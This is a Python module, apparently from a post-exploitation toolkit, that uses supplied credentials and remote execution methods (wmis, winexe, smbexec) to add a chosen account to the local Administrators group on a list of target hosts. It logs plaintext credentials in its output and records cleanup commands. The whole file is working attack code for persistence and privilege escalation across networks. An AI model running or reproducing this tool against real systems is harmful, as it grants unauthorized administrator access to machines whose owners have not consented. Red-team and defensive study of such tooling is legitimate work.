"""

Module to add a user to a localgroup.
Defaults to adding to the "Administrators" group.

Module built by @harmj0y

"""

from lib import helpers
from lib import command_methods

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):
        
        self.name = "Add User to Localgroup"
        self.description = "Adds a user to a localgroup on a host or host list."

        # internal list() that holds one or more targets 
        self.targets = targets

        # internal list() that holds one or more cred tuples
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # a state output file that will be written out by pillage.py
        #   ex- if you're querying domain users
        self.output = ""

        # a cleanup file that will be written out by pillage.py
        #   ex- if you're enabling the sticky-keys backdoor on systems
        self.cleanup = ""

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"trigger_method"   : ["wmis", "[wmis], [winexe], or [smbexec] for triggering"],
                                 "user"             : ["", "[Domain\]Username to add."],
                                 "localgroup"       : ["administrators", "localgroup to add user to"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        triggerMethod = self.required_options["trigger_method"][0]

        for target in self.targets:

            userToAdd = self.required_options["user"][0]
            groupToAdd = self.required_options["localgroup"][0]

            # command to add the user to the specified localgroup
            groupAddCommand = "net localgroup "+groupToAdd+" "+userToAdd+" /add"

            # execute the localgroup add command and get the result
            groupAddResult = command_methods.executeResult(target, username, password, groupAddCommand, triggerMethod)

            # check all of our results as appropriate
            if groupAddResult == "":
                self.output += "[!] No result file, localgroup add '"+userToAdd+" to "+groupToAdd+"' failed using creds '"+username+":"+password+"' on : " + target + "\n"
            
            elif "The command completed successfully" in groupAddResult:
                self.output += "[*] User '"+userToAdd+" added to "+groupToAdd+"' successfully using creds '"+username+":"+password+"' on " + target + "\n"

                # cleanup -> delete the user from the system
                cleanupCMD = "net localgroup "+groupToAdd+" "+userToAdd+" /delete"
                self.cleanup += "executeCommand|"+target+"|"+username+"|"+password+"|"+cleanupCMD+"|"+triggerMethod+"\n"

            else:
                self.output += "[!] Localgroup add '"+userToAdd+" to "+groupToAdd+"' failed using creds '"+username+":"+password+"' on : " + target + "\n"
